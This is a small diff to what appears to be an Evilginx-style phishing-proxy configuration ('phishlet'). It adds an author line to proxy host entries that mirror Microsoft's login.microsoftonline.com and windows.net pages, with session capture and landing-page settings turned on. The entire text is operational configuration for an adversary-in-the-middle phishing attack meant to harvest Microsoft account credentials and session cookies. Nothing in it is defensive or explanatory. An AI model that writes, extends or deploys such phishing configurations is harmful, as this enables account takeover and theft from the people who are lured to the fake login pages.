@@ -1,4 +1,5 @@
 min_ver: '3.0.0'
+author: '0fukuAkz'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'windows.net', session: true, is_landing: false, auto_filter: true}
